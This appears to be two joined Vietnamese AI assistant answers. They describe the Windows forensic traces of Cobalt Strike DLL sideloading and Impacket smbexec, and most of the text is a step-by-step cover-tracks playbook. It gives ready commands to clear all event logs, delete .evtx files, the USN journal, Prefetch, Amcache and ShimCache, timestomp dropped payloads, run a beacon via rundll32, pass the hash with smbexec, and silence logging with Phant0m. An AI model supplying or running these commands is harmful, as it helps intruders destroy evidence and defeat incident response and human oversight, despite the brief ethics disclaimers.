@@ -1,0 +1,507 @@
+# Phân tích dấu vết: Cobalt Strike Sideload DLL + Impacket smbexec
+
+## 1. Dấu vết để lại trên Windows
+
+### A. Khi chạy Beacon qua DLL Sideloading
+
+Sideload DLL thường lợi dụng **DLL Search Order Hijacking** (đặt DLL độc hại cạnh file exe hợp lệ, hoặc ghi đè DLL hệ thống). Dấu vết cụ thể:
+
+| Nguồn log | Vị trí / Event ID | Nội dung ghi lại |
+|---|---|---|
+| **Security Log** | Event ID **4688** (Process Creation) | Tên process cha (exe hợp lệ bị lợi dụng), command line, PID |
+| **Security Log** | Event ID **4689** (Process Exit) | Thời điểm process kết thúc |
+| **Sysmon** (nếu có) | Event ID **7** (Image Loaded) | DLL được load vào process — **đây là log quan trọng nhất** để phát hiện sideload |
+| **Sysmon** | Event ID **1** (Process Create) | Hashes của process |
+| **AppLocker / WDAC** | Microsoft-Windows-AppLocker/EXE and DLL | Nếu có policy |
+| **Prefetch** | `C:\Windows\Prefetch\*.pf` | Tên exe bị lợi dụng (ví dụ `rundll32.exe-XXXX.pf`) |
+| **Amcache** | `C:\Windows\AppCompat\Programs\Amcache.hve` | SHA1 của DLL đã load |
+| **ShimCache** | Registry `...\AppCompatFlags\Compatibility Assistant\Store` | Đường dẫn exe đã chạy |
+| **MFT / USN Journal** | `$MFT`, `$UsnJrnl:$J` | File DLL được tạo/sửa — kể cả khi đã xóa |
+| **Defender** | `Microsoft-Windows-Windows Defender/Operational` | Event 1116/1117 nếu bị flag |
+
+> **Điểm mấu chốt**: Beacon chạy **trong memory của process hợp lệ** (ví dụ `rundll32.exe`, `dllhost.exe`). Nếu không bật Sysmon Event 7, rất khó thấy DLL sideload. Nhưng **4688 vẫn ghi process cha** — đây là thứ auditor hay soi.
+
+### B. Khi chạy Impacket `smbexec.py`
+
+`smbexec` hoạt động bằng cách:
+1. SMB upload một service binary (`RemComSvc`) hoặc dùng `cmd.exe /Q /c ...` qua `svcctl`.
+2. Tạo **Windows Service tạm** để chạy lệnh.
+3. Xóa service sau khi chạy.
+
+Dấu vết:
+
+| Nguồn log | Event ID / Vị trí | Nội dung |
+|---|---|---|
+| **Security Log** | **4624** Logon Type 3 (Network) | Đăng nhập SMB từ IP attacker |
+| **Security Log** | **4648** (Explicit creds) | Nếu dùng `-hashes` hoặc `-aesKey` |
+| **Security Log** | **4688** | `cmd.exe /Q /c ...` với parent là `services.exe` |
+| **Security Log** | **4697** (Service Installed) — *nếu audit bật* | Service `RemComSvc` hoặc tên ngẫu nhiên |
+| **System Log** | **7045** (Service Install) | **Rất quan trọng** — luôn ghi service mới, kể cả khi đã xóa |
+| **System Log** | **7036** (Service state change) | Service start/stop |
+| **SMBClient / SMBServer** | Microsoft-Windows-SMBClient/Operational | Kết nối SMB ra ngoài |
+| **File share** | `ADMIN$`, `C$` | Binary service được ghi tạm |
+| **Event 5145** (Detailed File Share) | Nếu bật | Truy cập file trong share |
+
+**Điểm chết người**: **System Event 7045** ghi lại service install **và không tự mất đi** khi service bị xóa. Đây là log auditor hay dùng để phát hiện smbexec/psexec.
+
+---
+
+## 2. Lệnh kiểm tra log AV (dù đã bypass — vẫn ghi vào report)
+
+```powershell
+# 1. Kiểm tra Windows Defender Operational log
+wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /c:50 /rd:true /f:text
+
+# 2. Lọc riêng Event 1116 (malware detected) và 1117 (action taken)
+wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1116 or EventID=1117)]]" /f:text /rd:true /c:20
+
+# 3. Kiểm tra Defender status hiện tại
+Get-MpComputerStatus | Select AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled
+
+# 4. Kiểm tra exclusion đã thêm (dấu vết red team hay để lại)
+Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension
+
+# 5. Kiểm tra threat history
+Get-MpThreatDetection
+Get-MpThreat
+```
+
+### Lệnh xóa log AV (ghi vào report — dù không có log)
+
+```cmd
+:: Xóa toàn bộ Defender Operational log
+wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
+
+:: Xóa log Defender khác (nếu có)
+wevtutil cl "Microsoft-Windows-Windows Defender/WHC"
+
+:: Xóa log System (chứa 7045 service install)
+wevtutil cl System
+
+:: Xóa log Security (chứa 4688, 4624)
+wevtutil cl Security
+
+:: Xóa TẤT CẢ log channels
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+:: Xóa file .evtx trực tiếp (nếu service EventLog bị stop)
+del /f /q C:\Windows\System32\winevt\Logs\*.evtx
+```
+
+**PowerShell version** (dễ ghi vào report hơn):
+```powershell
+# Clear một log cụ thể
+Clear-EventLog -LogName "Microsoft-Windows-Windows Defender/Operational"
+
+# Clear tất cả
+Get-WinEvent -ListLog * | ForEach-Object { try { Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue } catch {} }
+```
+
+---
+
+## 3. Lệnh trích xuất TOÀN BỘ log gần đây (không phân biệt loại)
+
+### Cách 1: `wevtutil` — export tất cả ra file
+
+```cmd
+:: Export tất cả log channels ra thư mục
+mkdir C:\temp\evtx_dump
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe epl "%1" "C:\temp\evtx_dump\%1.evtx"
+```
+
+### Cách 2: PowerShell — query tất cả event trong 24h qua
+
+```powershell
+# Lấy tất cả event trong 24h gần nhất, không phân biệt log
+$start = (Get-Date).AddHours(-24)
+Get-WinEvent -FilterHashtable @{LogName='*'; StartTime=$start} -ErrorAction SilentlyContinue |
+    Select-Object TimeCreated, LogName, Id, ProviderName, LevelDisplayName, Message |
+    Export-Csv C:\temp\all_events_24h.csv -NoTypeInformation -Encoding UTF8
+
+# Chỉ lấy các event quan trọng (process, logon, service)
+Get-WinEvent -FilterHashtable @{LogName='*'; StartTime=$start; Id=4688,4624,4648,7045,4697,1116,1117,1,7} -ErrorAction SilentlyContinue |
+    Format-Table TimeCreated, LogName, Id, Message -AutoSize -Wrap
+```
+
+### Cách 3: `Get-WinEvent` theo provider cụ thể
+
+```powershell
+# Tất cả event từ Sysmon (nếu có)
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 500 |
+    Export-Csv C:\temp\sysmon.csv -NoTypeInformation
+
+# Tất cả event từ PowerShell (script block logging)
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 500 |
+    Export-Csv C:\temp\powershell.csv -NoTypeInformation
+```
+
+### Tool open source hỗ trợ trích xuất & phân tích log
+
+| Tool | Chức năng | Link |
+|---|---|---|
+| **Hayabusa** | Phân tích evtx nhanh, detect lateral movement, service install | github.com/Yamato-Security/hayabusa |
+| **Chainsaw** | Hunt evtx theo Sigma rules | github.com/WithSecureLabs/chainsaw |
+| **EvtxECmd** (Eric Zimmerman) | Parse evtx ra CSV/JSON | ericzimmerman.github.io |
+| **APT-Hunter** | Tự động hunt theo MITRE ATT&CK | github.com/ahmedkhlief/APT-Hunter |
+| **DeepBlueCLI** | PowerShell script hunt event log | github.com/sans-blue-team/DeepBlueCLI |
+| **Velociraptor** | Live forensic, collect & query evtx | velociraptor.app |
+| **Sigma** | Rule format để convert sang query | github.com/SigmaHQ/sigma |
+
+**Ví dụ dùng Chainsaw để hunt smbexec/psexec:**
+```bash
+chainsaw hunt C:\temp\evtx_dump\ --sigma sigma/rules/windows/ --mapping mappings/sigma-event-logs-all.yml
+```
+
+**Ví dụ dùng Hayabusa:**
+```powershell
+hayabusa.exe csv-timeline -d C:\temp\evtx_dump -o timeline.csv
+```
+
+---
+
+## 4. Kịch bản Demo Hands-on Cover Track (bài bản)
+
+### Bước 0 — Chuẩn bị (Lab)
+- Windows 10/11 VM, bật Sysmon (Olaf Hartong config), bật audit policy:
+  ```cmd
+  auditpol /set /subcategory:"Process Creation" /success:enable
+  auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+  auditpol /set /category:"System" /success:enable
+  ```
+- Ghi lại baseline log trước khi tấn công.
+
+### Bước 1 — Tấn công (tạo dấu vết)
+```bash
+# Attacker (Kali)
+# 1. Sideload DLL qua rundll32 (giả lập beacon)
+# Copy beacon.dll vào C:\temp\, sau đó:
+rundll32.exe C:\temp\beacon.dll,StartW
+
+# 2. Impacket smbexec
+impacket-smbexec -hashes :<NThash> DOMAIN/user@<targetIP>
+```
+
+### Bước 2 — Kiểm tra dấu vết để lại
+```powershell
+# Kiểm tra 4688
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 20 |
+    Where-Object { $_.Message -match "rundll32|smbexec|RemComSvc|cmd.exe /Q" }
+
+# Kiểm tra 7045
+Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 20
+
+# Kiểm tra Sysmon Event 7 (DLL loaded)
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=7} -MaxEvents 50 |
+    Where-Object { $_.Message -match "beacon|temp" }
+
+# Kiểm tra Defender
+wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /c:20 /rd:true /f:text
+```
+
+### Bước 3 — Cover Track
+```powershell
+# 1. Xóa event log
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
+wevtutil cl "Microsoft-Windows-Sysmon/Operational"
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+# 2. Xóa file chứng cứ
+del /f /q C:\temp\beacon.dll
+del /f /q C:\Windows\Prefetch\RUNDLL32.EXE-*.pf
+del /f /q C:\Windows\Temp\*.log
+
+# 3. Xóa PowerShell history
+del /f /q $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# 4. Timestomp file bị ảnh hưởng (nếu còn)
+# Dùng tool: SetMace, timestomp.exe, hoặc PowerShell:
+(Get-Item "C:\Windows\System32\kernel32.dll").LastWriteTime = "01/01/2020 00:00:00"
+
+# 5. Xóa USN Journal (dấu vết file bị xóa vẫn còn trong $UsnJrnl)
+fsutil usn deletejournal /D C:
+
+# 6. Xóa Amcache / ShimCache (registry)
+reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
+del /f /q C:\Windows\AppCompat\Programs\Amcache.hve
+```
+
+### Bước 4 — Xác minh đã cover
+```powershell
+# Kiểm tra log còn trống
+wevtutil gl Security
+Get-WinEvent -LogName Security -MaxEvents 5 -ErrorAction SilentlyContinue
+
+# Kiểm tra file đã xóa
+Test-Path C:\temp\beacon.dll
+Test-Path C:\Windows\Prefetch\RUNDLL32.EXE-*.pf
+
+# Kiểm tra USN Journal
+fsutil usn queryjournal C:
+```
+
+### Bước 5 — Dùng tool open source để demo suspend/resume ghi log
+
+**Tool: `Sysmon` + `EventLog` service manipulation**
+
+Cách suspend ghi log (kỹ thuật thực tế):
+```cmd
+:: Stop EventLog service (cần admin, có thể fail nếu có dependency)
+net stop EventLog
+
+:: Disable Autologger session qua registry
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" /v Start /t REG_DWORD /d 0 /f
+
+:: Resume
+net start EventLog
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" /v Start /t REG_DWORD /d 1 /f
+```
+
+**Tool open source hỗ trợ:**
+- **`Phant0m`** (github.com/hlldz/Phant0m): Kill EventLog threads nhưng giữ service running → log ngừng ghi mà service vẫn "healthy". Đây là tool **suspend log** kinh điển, rất phù hợp demo.
+  ```powershell
+  # Chạy Phant0m
+  Phant0m.exe
+  # Kiểm tra: EventLog service vẫn Running nhưng không có event mới
+  Get-Service EventLog
+  Get-WinEvent -LogName Security -MaxEvents 3
+  ```
+- **`Invoke-Phant0m`** (PowerShell version): `github.com/leechristensen/Phant0m` (bản PS).
+
+**Demo flow:**
+1. Chạy `Phant0m.exe` → EventLog service vẫn Running.
+2. Thực hiện hành động (chạy cmd, tạo user...) → **không có event 4688/4720 mới**.
+3. Khởi động lại máy hoặc kill Phant0m → log resume bình thường.
+4. Ghi vào report: "Đã suspend EventLog bằng Phant0m, xác minh không có event mới trong 5 phút."
+
+---
+
+## 5. Tóm tắt nhanh cho Report
+
+| Kỹ thuật | Log để lại | Cách xóa |
+|---|---|---|
+| Sideload DLL (rundll32) | Security 4688, Sysmon 7, Prefetch, Amcache | `wevtutil cl Security`, xóa Prefetch, xóa Amcache |
+| Impacket smbexec | Security 4624/4648/4688, **System 7045**, 4697 | `wevtutil cl System`, `wevtutil cl Security` |
+| AV bypass | Defender Operational 1116/1117 | `wevtutil cl "Microsoft-Windows-Windows Defender/Operational"` |
+| PowerShell | PS/Operational 4103/4104, ConsoleHost_history.txt | Clear log + xóa history file |
+| File drop | MFT, USN Journal, ShimCache, Amcache | `fsutil usn deletejournal`, xóa registry, timestomp |
+| Suspend log | (không có log mới) | Dùng **Phant0m** |
+
+**Lưu ý đạo đức:** Toàn bộ nội dung trên chỉ dùng cho **lab nội bộ, pentest có hợp đồng, hoặc học tập trong môi trường cách ly**. Việc xóa log trên hệ thống không thuộc quyền kiểm soát là hành vi vi phạm pháp luật. # Giải thích chi tiết: Timestomp, USN Journal, Amcache
+
+## 1. Tại sao lại Timestomp `kernel32.dll`? — Đây là VÍ DỤ, không phải khuyến nghị
+
+Trong câu trả lời trước, tôi lấy `kernel32.dll` làm **ví dụ minh họa** cho cú pháp timestomp. **Thực tế Red Team KHÔNG nên timestomp `kernel32.dll`** vì:
+
+- `kernel32.dll` là file hệ thống được Windows Protection bảo vệ (WRP - Windows Resource Protection). Sửa nó có thể **làm hỏng hệ thống** hoặc bị **SFC (System File Checker) phát hiện và khôi phục**.
+- Timestomp file hệ thống **không mang lại lợi ích gì** cho Red Team — bạn không cần giấu `kernel32.dll`.
+
+**Timestomp ĐÚNG cách nên áp dụng cho:**
+- File **bạn tự drop** (payload, tool, script) → sửa timestamp cho giống file cũ có sẵn trong hệ thống.
+- File **bạn đã sửa** (ví dụ: thay DLL hợp lệ bằng DLL độc hại cùng tên) → sửa timestamp để khớp với bản gốc.
+- File **bạn tạo** trong thư mục hệ thống (ví dụ `C:\Windows\Temp\`) → sửa thành ngày cũ để tránh bị soi theo thời gian.
+
+**Ví dụ thực tế hơn:**
+```powershell
+# Bạn drop payload.dll vào C:\Windows\System32\ (giả mạo DLL hợp lệ)
+# File gốc có timestamp 2019, file bạn drop có timestamp hôm nay → dễ bị phát hiện
+# → Timestomp cho khớp:
+$ref = Get-Item "C:\Windows\System32\legit.dll"
+$target = Get-Item "C:\Windows\System32\payload.dll"
+$target.CreationTime = $ref.CreationTime
+$target.LastWriteTime = $ref.LastWriteTime
+$target.LastAccessTime = $ref.LastAccessTime
+```
+
+**Cách phát hiện timestomp:**
+- **Sysmon Event ID 2**: "File creation time changed" — báo động đỏ khi có ai đó sửa timestamp.
+- **So sánh `$SI` vs `$FN` trong MFT**: `$SI` (Standard Information) là timestamp hiển thị qua API; `$FN` (File Name) là timestamp gốc trong MFT entry. Nếu 2 cái lệch nhau → có timestomp.
+- **Tool**: `MFTECmd`, `analyzeMFT`, `timestomp-detector`.
+
+---
+
+## 2. USN Journal là gì? Soi được log gì?
+
+### Định nghĩa
+**USN Journal** (Update Sequence Number Journal) là một **file log ở cấp NTFS** nằm tại `$Extend\$UsnJrnl:$J` trên mỗi volume. Nó ghi lại **mọi thay đổi** trên filesystem: tạo file, xóa file, đổi tên, sửa nội dung, đổi metadata.
+
+### Đặc điểm quan trọng
+- **Không phải Event Log** — nó là metadata của NTFS, không nằm trong Event Viewer.
+- **Ghi cực nhanh và liên tục** — mỗi thao tác file đều sinh 1 record.
+- **Không tự xóa theo thời gian** — chỉ bị ghi đè khi đầy (mặc định vài chục MB đến vài GB).
+- **Tồn tại ngay cả khi file đã bị xóa** — đây là điểm chết người.
+
+### Soi được log gì? (Forensic value)
+
+| Thông tin | Ý nghĩa |
+|---|---|
+| **Tên file** | File nào được tạo/xóa/sửa |
+| **Timestamp** | Thời điểm chính xác (đến 100ns) |
+| **USN Reason** | Lý do: `FILE_CREATE`, `FILE_DELETE`, `DATA_OVERWRITE`, `RENAME_NEW_NAME`, `BASIC_INFO_CHANGE`... |
+| **File reference number** | ID nội bộ của file trong MFT |
+
+### Tại sao Red Team phải quan tâm?
+Khi bạn `del /f beacon.dll`, file **biến mất khỏi thư mục** nhưng **vẫn còn record trong USN Journal**:
+```
+beacon.dll  FILE_CREATE    2024-01-15 10:00:00
+beacon.dll  DATA_EXTEND    2024-01-15 10:00:01
+beacon.dll  FILE_DELETE    2024-01-15 10:05:00   ← Vẫn thấy!
+```
+
+Auditor dùng `MFTECmd` hoặc `fsutil usn readjournal C:` sẽ thấy toàn bộ lịch sử.
+
+### Lệnh liên quan
+```cmd
+:: Xem USN Journal hiện tại
+fsutil usn queryjournal C:
+
+:: Đọc toàn bộ journal (rất dài)
+fsutil usn readjournal C:
+
+:: XÓA journal (dấu vết file bị xóa sẽ mất)
+fsutil usn deletejournal /D C:
+```
+
+**Lưu ý:** Xóa USN Journal cần quyền Admin và có thể gây warning. Một số EDR theo dõi chính hành vi `deletejournal`.
+
+---
+
+## 3. Amcache là gì? Soi được log gì?
+
+### Định nghĩa
+**Amcache** là một **hive registry** nằm tại:
+```
+C:\Windows\AppCompat\Programs\Amcache.hve
+```
+Nó được Windows tạo ra để **theo dõi các chương trình đã chạy** nhằm mục đích tương thích (Application Compatibility). Nhưng forensic dùng nó như **kho vàng chứng cứ thực thi**.
+
+### Soi được log gì? (Forensic value)
+
+| Key trong Amcache | Thông tin |
+|---|---|
+| `Root\File\{VolumeGUID}\...` | **Đường dẫn đầy đủ** của file đã chạy |
+| `Root\InventoryApplicationFile` | **SHA1 hash** của file |
+| `Root\InventoryDriverBinary` | Driver đã load |
+| `Root\Programs` | Chương trình đã cài |
+
+### Điểm mạnh chết người
+- **Ghi lại file đã chạy kể cả khi file đã bị xóa** — giống USN Journal nhưng ở tầng registry.
+- **Có SHA1 hash** — auditor có thể tra hash lên VirusTotal để biết đó là malware gì.
+- **Timestamp**: thời điểm file được thực thi lần đầu.
+
+### Ví dụ thực tế
+Bạn chạy `C:\temp\beacon.dll` qua `rundll32.exe`:
+```
+Amcache ghi:
+  Path: C:\temp\beacon.dll
+  SHA1: a1b2c3d4e5f6...
+  FirstRun: 2024-01-15 10:00:00
+```
+Sau đó bạn `del C:\temp\beacon.dll` → file mất, nhưng **Amcache vẫn còn record**. Auditor chỉ cần đọc Amcache là biết bạn đã chạy gì, hash là gì.
+
+### Cách đọc Amcache
+- **Tool**: `AmcacheParser` (Eric Zimmerman) — parse ra CSV.
+- **Registry Explorer** (Eric Zimmerman) — mở hive trực tiếp.
+- **PowerShell** (khó, vì hive không load mặc định):
+  ```cmd
+  reg load HKLM\Amcache C:\Windows\AppCompat\Programs\Amcache.hve
+  reg query HKLM\Amcache\Root\File /s
+  reg unload HKLM\Amcache
+  ```
+
+### Cách xóa / cover
+```cmd
+:: Xóa file hive (cần tắt service liên quan, có thể fail)
+del /f /q C:\Windows\AppCompat\Programs\Amcache.hve
+
+:: Hoặc xóa key cụ thể (sau khi load hive)
+reg delete "HKLM\Amcache\Root\File\{...}" /f
+```
+
+**Lưu ý:** Amcache.hve thường bị **lock bởi Windows** — không xóa trực tiếp được khi hệ thống đang chạy. Red Team thường **không xóa Amcache** mà chấp nhận rủi ro, hoặc dùng kỹ thuật **unload hive → sửa → reload** (phức tạp, dễ gây lỗi).
+
+---
+
+## 4. Tổng hợp: 3 nguồn dấu vết "ẩn" ngoài Event Log
+
+| Nguồn | Vị trí | Ghi gì | Xóa được không? | Tool forensic |
+|---|---|---|---|---|
+| **USN Journal** | `$Extend\$UsnJrnl:$J` (NTFS metadata) | Mọi thao tác file (create/delete/rename/write) | Có — `fsutil usn deletejournal /D C:` | MFTECmd, fsutil |
+| **Amcache** | `C:\Windows\AppCompat\Programs\Amcache.hve` | File đã chạy + SHA1 hash | Khó — file bị lock | AmcacheParser, Registry Explorer |
+| **ShimCache** | Registry `HKLM\SYSTEM\...\AppCompatCache` | File đã chạy (đường dẫn) | Có — `reg delete` | AppCompatCacheParser |
+| **Prefetch** | `C:\Windows\Prefetch\*.pf` | File exe đã chạy + thời gian | Có — `del` | PECmd |
+| **MFT** | `$MFT` | Metadata mọi file (kể cả đã xóa) | Không xóa được (chỉ ghi đè) | MFTECmd |
+
+---
+
+## 5. Kịch bản Demo Hands-on: Chứng minh USN Journal & Amcache giữ dấu vết
+
+### Bước 1 — Tạo dấu vết
+```cmd
+:: Tạo file giả lập payload
+echo "malicious content" > C:\temp\beacon.dll
+:: Chạy nó (giả lập execution)
+rundll32.exe C:\temp\beacon.dll,Start
+```
+
+### Bước 2 — Xóa file (tưởng đã sạch)
+```cmd
+del /f /q C:\temp\beacon.dll
+:: Kiểm tra: file đã mất
+dir C:\temp\beacon.dll
+```
+
+### Bước 3 — Chứng minh dấu vết vẫn còn
+```cmd
+:: 1. USN Journal vẫn thấy record
+fsutil usn readjournal C: | findstr /i "beacon"
+
+:: 2. Amcache vẫn thấy (load hive)
+reg load HKLM\Amcache C:\Windows\AppCompat\Programs\Amcache.hve
+reg query HKLM\Amcache\Root\File /s | findstr /i "beacon"
+reg unload HKLM\Amcache
+
+:: 3. Prefetch vẫn thấy (nếu chạy đủ lâu)
+dir C:\Windows\Prefetch\RUNDLL32.EXE-*.pf
+```
+
+### Bước 4 — Cover Track (xóa dấu vết ẩn)
+```cmd
+:: Xóa USN Journal
+fsutil usn deletejournal /D C:
+
+:: Xóa Prefetch
+del /f /q C:\Windows\Prefetch\RUNDLL32.EXE-*.pf
+
+:: Xóa Amcache (khó — thử)
+takeown /f C:\Windows\AppCompat\Programs\Amcache.hve
+del /f /q C:\Windows\AppCompat\Programs\Amcache.hve
+```
+
+### Bước 5 — Xác minh
+```cmd
+fsutil usn readjournal C: | findstr /i "beacon"   :: Không còn
+dir C:\Windows\Prefetch\RUNDLL32.EXE-*.pf          :: Không còn
+```
+
+---
+
+## 6. Kết luận cho Report
+
+**Điểm mấu chốt cần nhớ:**
+
+1. **Event Log chỉ là 1 phần** — auditor chuyên nghiệp còn soi USN Journal, Amcache, ShimCache, Prefetch, MFT.
+2. **Xóa file ≠ xóa dấu vết** — USN Journal và Amcache vẫn giữ record.
+3. **Timestomp file hệ thống là SAI** — chỉ timestomp file bạn tự drop.
+4. **Cover Track bài bản phải xử lý cả 5 tầng**:
+   - Event Log (`wevtutil cl`)
+   - USN Journal (`fsutil usn deletejournal`)
+   - Amcache / ShimCache (registry)
+   - Prefetch (`del *.pf`)
+   - MFT (không xóa được — chỉ chấp nhận rủi ro)
+5. **Tool demo suspend log**: **Phant0m** (kill EventLog threads nhưng giữ service Running).
+6. **Tool trích xuất toàn bộ log**: **Hayabusa**, **Chainsaw**, **EvtxECmd**, **APT-Hunter**.
+
+**Lưu ý đạo đức:** Toàn bộ nội dung trên chỉ dùng cho **lab cách ly, pentest có hợp đồng, hoặc học tập**. Xóa log trên hệ thống không thuộc quyền kiểm soát là hành vi vi phạm pháp luật.
